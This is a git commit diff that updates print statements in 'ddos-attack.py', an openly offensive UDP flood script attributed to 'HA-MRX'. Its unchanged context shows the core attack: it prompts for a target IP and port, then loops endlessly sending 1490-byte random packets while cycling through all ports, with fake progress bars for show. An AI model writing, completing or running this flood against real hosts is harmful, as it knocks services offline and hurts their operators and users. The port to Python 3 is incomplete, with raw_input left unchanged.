9fb626788e6efaf07cc5bcd725fc4dc619757ffe
tuyulmenangiss <117646140+tuyulmenangiss@users.noreply.github.com>
2025-02-05 03:33:23 +0700

    Update ddos-attack.py

--- ddos-attack.py
+++ ddos-attack.py
@@ -19,30 +19,30 @@ bytes = random._urandom(1490)
 
 os.system("clear")
 os.system("figlet DDos Attack")
-print "Author   : HA-MRX"
-print "github   : https://github.com/Ha3MrX"
+print("Author   : HA-MRX")
+print("github   : https://github.com/Ha3MrX")
 print
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
 
 os.system("clear")
 os.system("figlet Attack Starting")
-print "[                    ] 0% "
+print("[                    ] 0% ")
 time.sleep(5)
-print "[=====               ] 25%"
+print("[=====               ] 25%")
 time.sleep(5)
-print "[==========          ] 50%"
+print("[==========          ] 50%")
 time.sleep(5)
-print "[===============     ] 75%"
+print("[===============     ] 75%")
 time.sleep(5)
-print "[====================] 100%"
+print("[====================] 100%")
 time.sleep(3)
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     print("Sent %s packet to %s throught port:%s"%(sent,ip,port))
      if port == 65534:
        port = 1
 
